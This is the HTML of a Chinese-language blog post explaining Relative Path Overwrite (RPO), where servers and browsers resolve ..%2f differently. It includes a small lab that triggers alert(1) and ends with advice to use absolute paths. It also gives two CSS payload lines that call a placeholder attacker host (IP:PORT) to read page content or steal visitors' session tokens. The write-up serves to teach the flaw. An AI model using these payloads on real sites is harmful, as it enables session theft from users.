@@ -1,0 +1,428 @@
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <title>Jhe&#39;s blog - Relative Path Overwrite </title>
+    
+    
+    <meta content="RPO, Web, security" name="keywords">
+    
+    <meta content="Jhe&#39;s blog - 在前端網頁引入資源(javascript, CSS)時使用相對路徑，並因為客戶端瀏覽器與伺服端解析之差異所造成的問題，可能造成瀏覽器執行預期外的 javascript 或 CSS。
+當 Apache 啟用 AllowEncodedSlashes On 或是使用 Nginx 的時候，後端伺服器會將 ..%2f 解析成 ../，但瀏覽器則會把它當成檔名的一部分，且當頁面引入資源使用相對路徑時，將造成瀏覽器與伺服器的解析不一致。
+Lab. 範例目錄結構
+index.php test/ - a.js index.html 程式碼
+&lt;html&gt; &lt;script src=a.js&gt;&lt;/script&gt; &lt;/html&gt; a.js 程式碼
+alert(1) 使用相對路徑引入一個名為 a.js 的 javascript，但其實 a.js 存在於 test 目錄下
+訪問首頁後一切正常，嘗試訪問 http://IP/test/..%2findex.html 神奇的事情發生了，alert(1) 跳了出來。
+ 瀏覽器向伺服器發出 http://IP/test/..%2findex.html 請求 伺服器將 ..%2f 轉換成 ../ 所以伺服器看到的是 http://IP/test/../index.html，所以伺服器返回的是 http://IP/index.html 的內容 瀏覽器並不會自動轉義 ..%2f 只是將之當成檔案名稱送出，收到伺服器回應後，瀏覽器依照相對路徑引入資源 a.js ，對於瀏覽器來說，當前目錄應該是 test 於是送出 http://IP/test/a.js 請求  可以用一些 CSS 的黑魔法來讀取頁面內容，或是取得瀏覽者的 session token {} @import url(http://IP:PORT); {} * {background: url(http://IP:PORT);}" name="description">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    
+    
+
+    
+
+    
+
+    
+
+    <link rel="stylesheet" href="/layui/css/layui.css">
+    <link rel="stylesheet" href="/self/css/default.css">
+    <script src="/layui/layui.js"></script>
+
+    <link rel="stylesheet" async href="/self/css/markdown.min.css">
+    <link rel="stylesheet" async href="/self/css/gallery.css">
+    
+    
+    
+
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0=" crossorigin="anonymous"></script>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" integrity="sha256-eZrrJcwDc/3uDhsdt61sL2oOBY362qM3lon1gyExkL0=" crossorigin="anonymous">
+    <script async src="https://cdn.jsdelivr.net/npm/lazysizes@5.2.0/lazysizes.min.js" integrity="sha256-h2tMEmhemR2IN4wbbdNjj9LaDIjzwk2hralQwfJmBOE=" crossorigin="anonymous"></script></head>
+
+<body>
+    
+    <header class="layui-header layui-bg-cyan">
+
+    
+    
+    <a class="nav-self-logo" href="/">
+        Jhe&#39;s blog
+    </a>
+
+    <ul class="layui-nav layui-layout-right layui-bg-cyan" lay-filter="">
+        
+        
+        <li class="layui-nav-item" id="nav_big"><a href="/post/">Posts</a></li>
+        
+
+        
+
+        
+        <li class="layui-nav-item" id="nav_small">
+            <a href="javascript:;">
+                <i class="layui-icon layui-icon-app" style="font-size: 24px;"></i>
+            </a>
+
+            <dl class="layui-nav-child">
+                
+                <dd><a href="/post/">Posts</a></dd>
+                
+
+                
+            </dl>
+        </li>
+    </ul>
+</header>
+
+<script>
+layui.use('element', function(){
+  var element = layui.element;
+});
+</script>
+        <div id="content" style="min-height:80%">
+<div class="layui-container" style="margin-bottom: 10px">
+    
+
+    <div class="layui-row layui-col-space10">
+        <div class="layui-col-md8 layui-col-sm12 layui-col-xs12">
+            <div class="layui-card single-card">
+                <br />
+                <blockquote class="self-elem-quote  markdown-body single-title" >
+                    <h1>Relative Path Overwrite</h1>
+                    <h3 style="margin-top:10px; margin-bottom:10px"> 
+    <i class="layui-icon layui-icon-date" style="font-size: 28px; vertical-align: -2px;"></i>
+    <span>2019-03-01</span>
+
+    
+     
+    <i class="layui-icon layui-icon-list" style="font-size: 32px; vertical-align: -3px;"></i>
+    
+
+    
+        <a href="/categories/security/">
+            <span class="layui-badge " style="vertical-align: 2px;">security</span>
+        </a>
+    
+
+    
+    <i class="layui-icon layui-icon-tabs" style="font-size: 22px; vertical-align: 1px;margin-right:2px;"></i>
+    
+
+    
+        <a href="/tags/rpo/">
+            <span class="layui-badge " style="vertical-align: 2px;">RPO</span>
+        </a>
+    
+        <a href="/tags/web/">
+            <span class="layui-badge " style="vertical-align: 2px;">Web</span>
+        </a>
+    
+    
+</h3>
+                </blockquote>
+                <div class="layui-card-body markdown-body single-content">
+                    <p>在前端網頁引入資源(javascript, CSS)時使用相對路徑，並因為客戶端瀏覽器與伺服端解析之差異所造成的問題，可能造成瀏覽器執行預期外的 javascript 或 CSS。</p>
+<p>當 Apache 啟用 <code>AllowEncodedSlashes On</code> 或是使用 Nginx 的時候，後端伺服器會將 <code>..%2f</code> 解析成 <code>../</code>，但瀏覽器則會把它當成檔名的一部分，且當頁面引入資源使用相對路徑時，將造成瀏覽器與伺服器的解析不一致。</p>
+<h3 id="lab">Lab.</h3>
+<p>範例目錄結構</p>
+<pre tabindex="0"><code>index.php
+test/
+   - a.js
+</code></pre><p>index.html 程式碼</p>
+<pre tabindex="0"><code class="language-htmlembedded=" data-lang="htmlembedded=">&lt;html&gt;
+&lt;script src=a.js&gt;&lt;/script&gt;
+&lt;/html&gt;
+</code></pre><p>a.js 程式碼</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#a6e22e">alert</span>(<span style="color:#ae81ff">1</span>)
+</code></pre></div><p>使用相對路徑引入一個名為 <code>a.js</code> 的 javascript，但其實 <code>a.js</code> 存在於 <code>test</code> 目錄下</p>
+<p>訪問首頁後一切正常，嘗試訪問 <code>http://IP/test/..%2findex.html</code> 神奇的事情發生了，<code>alert(1)</code> 跳了出來。</p>
+<ol>
+<li>瀏覽器向伺服器發出 <code>http://IP/test/..%2findex.html</code> 請求</li>
+<li>伺服器將 <code>..%2f</code> 轉換成 <code>../</code> 所以伺服器看到的是 <code>http://IP/test/../index.html</code>，所以伺服器返回的是 <code>http://IP/index.html</code> 的內容</li>
+<li>瀏覽器並不會自動轉義 <code>..%2f</code> 只是將之當成檔案名稱送出，收到伺服器回應後，瀏覽器依照相對路徑引入資源 <code>a.js</code> ，對於瀏覽器來說，當前目錄應該是 <code>test</code> 於是送出 <code>http://IP/test/a.js</code> 請求</li>
+</ol>
+<p>可以用一些 CSS 的黑魔法來讀取頁面內容，或是取得瀏覽者的 session token
+<code>{} @import url(http://IP:PORT);</code>
+<code>{} * {background: url(http://IP:PORT);}</code></p>
+<h3 id="conclusion">Conclusion</h3>
+<p>使用絕對路徑就可以解決大部分的問題，當前流行的框架大多都有 rewrite 可能也會有 RPO 存在。</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://lalajun.github.io/2018/04/27/WEB-RPO%E6%94%BB%E5%87%BB/">WEB-RPO攻击</a></li>
+<li><a href="https://li4n0.github.io/post/17d5a501/">从一道CTF题看懂RPO攻击原理</a></li>
+<li><a href="https://www.smi1e.top/%E6%B5%85%E8%B0%88rpo%E6%94%BB%E5%87%BB/">浅谈RPO攻击</a></li>
+<li><a href="https://www.k0rz3n.com/2018/03/28/RPO%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E7%9A%84%E6%8E%A2%E7%A9%B6/">RPO攻击方式的探究</a></li>
+<li><a href="https://www.wzsite.cn/2018/03/27/RPO%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90/">RPO攻击解析</a></li>
+<li><a href="http://blog.nsfocus.net/rpo-attack/">RPO攻击技术浅析</a></li>
+<li><a href="https://xz.aliyun.com/t/2220">深入剖析RPO漏洞</a></li>
+<li><a href="https://www.cnblogs.com/p00mj/p/6755000.html">RPO攻击</a></li>
+<li><a href="http://39.106.59.19/2018/03/11-rpo%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0.html">RPO漏洞学习</a></li>
+<li><a href="https://mntn0x.github.io/2018/04/15/RPO%E7%9B%B8%E5%AF%B9%E8%B7%AF%E5%BE%84%E8%A6%86%E7%9B%96%E6%94%BB%E5%87%BB/">RPO相对路径覆盖攻击</a></li>
+</ul>
+</div>
+            </div>
+        </div>
+
+        <div class="layui-col-md4 layui-col-sm12 layui-col-xs12">
+            
+            <div class="layui-card single-card">
+                <h2 class="single-title">Relevant Topics</h2>
+                
+                	
+                    <div style="margin-left: 10px;">
+                        <blockquote class="self-elem-quote " style="background-color:#FFFFFF;margin-top: 10px;">
+                            <a href="/post/jwt/">
+                                <h3 class="">JWT</h3>
+                            </a>
+                            
+                            <h3 style="margin-top:10px; margin-bottom:10px"> 
+    <i class="layui-icon layui-icon-date" style="font-size: 28px; vertical-align: -2px;"></i>
+    <span>2017-04-03</span>
+
+    
+     
+    <i class="layui-icon layui-icon-list" style="font-size: 32px; vertical-align: -3px;"></i>
+    
+
+    
+        <a href="/categories/security/">
+            <span class="layui-badge " style="vertical-align: 2px;">security</span>
+        </a>
+    
+
+    
+    <i class="layui-icon layui-icon-tabs" style="font-size: 22px; vertical-align: 1px;margin-right:2px;"></i>
+    
+
+    
+        <a href="/tags/web/">
+            <span class="layui-badge " style="vertical-align: 2px;">Web</span>
+        </a>
+    
+        <a href="/tags/jwt/">
+            <span class="layui-badge " style="vertical-align: 2px;">JWT</span>
+        </a>
+    
+    
+</h3>
+                        </blockquote>
+                    </div>
+                	
+                
+                <br />
+            </div>
+            
+
+            <div class="layui-card single-card">
+                <h2 class="single-title">Recent Posts</h2>
+            
+                
+                <div style="margin-left: 10px;">
+                    <blockquote class="self-elem-quote " style="background-color:#FFFFFF;margin-top: 10px;">
+                    <a href="/post/breakdown_mips_binary_exploit_with_qdb/">
+                        <h3 class="">Breakdown MIPS binary exploit with Qdb</h3>
+                    </a>
+                    <h3 style="margin-top:10px; margin-bottom:10px"> 
+    <i class="layui-icon layui-icon-date" style="font-size: 28px; vertical-align: -2px;"></i>
+    <span>2021-02-01</span>
+
+    
+     
+    <i class="layui-icon layui-icon-list" style="font-size: 32px; vertical-align: -3px;"></i>
+    
+
+    
+        <a href="/categories/security/">
+            <span class="layui-badge " style="vertical-align: 2px;">security</span>
+        </a>
+    
+
+    
+    <i class="layui-icon layui-icon-tabs" style="font-size: 22px; vertical-align: 1px;margin-right:2px;"></i>
+    
+
+    
+        <a href="/tags/qiling/">
+            <span class="layui-badge " style="vertical-align: 2px;">Qiling</span>
+        </a>
+    
+        <a href="/tags/qdb/">
+            <span class="layui-badge " style="vertical-align: 2px;">Qdb</span>
+        </a>
+    
+        <a href="/tags/iot/">
+            <span class="layui-badge " style="vertical-align: 2px;">IoT</span>
+        </a>
+    
+    
+</h3>
+                    </blockquote>
+                </div>
+                
+                <div style="margin-left: 10px;">
+                    <blockquote class="self-elem-quote " style="background-color:#FFFFFF;margin-top: 10px;">
+                    <a href="/post/cve_2020_8962/">
+                        <h3 class="">How to reproduce CVE-2020-8962 with Qiling Framework</h3>
+                    </a>
+                    <h3 style="margin-top:10px; margin-bottom:10px"> 
+    <i class="layui-icon layui-icon-date" style="font-size: 28px; vertical-align: -2px;"></i>
+    <span>2020-07-30</span>
+
+    
+     
+    <i class="layui-icon layui-icon-list" style="font-size: 32px; vertical-align: -3px;"></i>
+    
+
+    
+        <a href="/categories/security/">
+            <span class="layui-badge " style="vertical-align: 2px;">security</span>
+        </a>
+    
+
+    
+    <i class="layui-icon layui-icon-tabs" style="font-size: 22px; vertical-align: 1px;margin-right:2px;"></i>
+    
+
+    
+        <a href="/tags/qiling/">
+            <span class="layui-badge " style="vertical-align: 2px;">Qiling</span>
+        </a>
+    
+        <a href="/tags/cve/">
+            <span class="layui-badge " style="vertical-align: 2px;">CVE</span>
+        </a>
+    
+        <a href="/tags/d-link/">
+            <span class="layui-badge " style="vertical-align: 2px;">D-Link</span>
+        </a>
+    
+    
+</h3>
+                    </blockquote>
+                </div>
+                
+                <div style="margin-left: 10px;">
+                    <blockquote class="self-elem-quote " style="background-color:#FFFFFF;margin-top: 10px;">
+                    <a href="/post/elf_symbol_resolving/">
+                        <h3 class="">ELF Symbol Resolving</h3>
+                    </a>
+                    <h3 style="margin-top:10px; margin-bottom:10px"> 
+    <i class="layui-icon layui-icon-date" style="font-size: 28px; vertical-align: -2px;"></i>
+    <span>2019-12-12</span>
+
+    
+     
+    <i class="layui-icon layui-icon-list" style="font-size: 32px; vertical-align: -3px;"></i>
+    
+
+    
+        <a href="/categories/security/">
+            <span class="layui-badge " style="vertical-align: 2px;">security</span>
+        </a>
+    
+
+    
+    <i class="layui-icon layui-icon-tabs" style="font-size: 22px; vertical-align: 1px;margin-right:2px;"></i>
+    
+
+    
+        <a href="/tags/elf/">
+            <span class="layui-badge " style="vertical-align: 2px;">ELF</span>
+        </a>
+    
+    
+</h3>
+                    </blockquote>
+                </div>
+                
+                <div style="margin-left: 10px;">
+                    <blockquote class="self-elem-quote " style="background-color:#FFFFFF;margin-top: 10px;">
+                    <a href="/post/python_pickle/">
+                        <h3 class="">Python Pickle</h3>
+                    </a>
+                    <h3 style="margin-top:10px; margin-bottom:10px"> 
+    <i class="layui-icon layui-icon-date" style="font-size: 28px; vertical-align: -2px;"></i>
+    <span>2019-05-30</span>
+
+    
+     
+    <i class="layui-icon layui-icon-list" style="font-size: 32px; vertical-align: -3px;"></i>
+    
+
+    
+        <a href="/categories/security/">
+            <span class="layui-badge " style="vertical-align: 2px;">security</span>
+        </a>
+    
+
+    
+    <i class="layui-icon layui-icon-tabs" style="font-size: 22px; vertical-align: 1px;margin-right:2px;"></i>
+    
+
+    
+        <a href="/tags/python/">
+            <span class="layui-badge " style="vertical-align: 2px;">Python</span>
+        </a>
+    
+        <a href="/tags/pickle/">
+            <span class="layui-badge " style="vertical-align: 2px;">Pickle</span>
+        </a>
+    
+    
+</h3>
+                    </blockquote>
+                </div>
+                
+                <div style="margin-left: 10px;">
+                    <blockquote class="self-elem-quote " style="background-color:#FFFFFF;margin-top: 10px;">
+                    <a href="/post/lazy_binding_in_elf/">
+                        <h3 class="">Lazy binding in ELF</h3>
+                    </a>
+                    <h3 style="margin-top:10px; margin-bottom:10px"> 
+    <i class="layui-icon layui-icon-date" style="font-size: 28px; vertical-align: -2px;"></i>
+    <span>2019-05-15</span>
+
+    
+     
+    <i class="layui-icon layui-icon-list" style="font-size: 32px; vertical-align: -3px;"></i>
+    
+
+    
+        <a href="/categories/security/">
+            <span class="layui-badge " style="vertical-align: 2px;">security</span>
+        </a>
+    
+
+    
+    <i class="layui-icon layui-icon-tabs" style="font-size: 22px; vertical-align: 1px;margin-right:2px;"></i>
+    
+
+    
+        <a href="/tags/elf/">
+            <span class="layui-badge " style="vertical-align: 2px;">ELF</span>
+        </a>
+    
+    
+</h3>
+                    </blockquote>
+                </div>
+                
+            
+            <br />
+            </div>
+        </div>
+
+    </div>
+</div>
+
+
+        </div><footer>
+    
+    
+    <div class="layui-container">
+        <p class="copyright">&copy; All rights reserved. Powered by <a href='https://gohugo.io' style='color:#FFFFFF'>Hugo</a> and <a href='https://github.com/ertuil/erblog' style='color:#FFFFFF'>Erblog</a>.</p>
+    </div>
+</footer>
+</body>
+</html>
